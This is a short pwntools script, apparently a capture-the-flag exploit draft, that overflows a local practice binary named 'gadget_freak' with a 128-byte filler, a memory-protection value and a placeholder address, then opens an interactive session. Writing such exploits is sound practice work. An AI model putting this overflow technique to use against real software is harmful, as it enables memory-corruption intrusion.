from pwn import *

p = process("./gadget_freak")
gdb.attach(p)

p.sendline(b"2")

payload  = b"X" * 128
payload += p32(7) # prot
payload += p32(0)
payload += p64(0x414141414141) # addr

p.send(payload)

p.sendline(b"2") # update 
p.sendline(b"7")

p.interactive()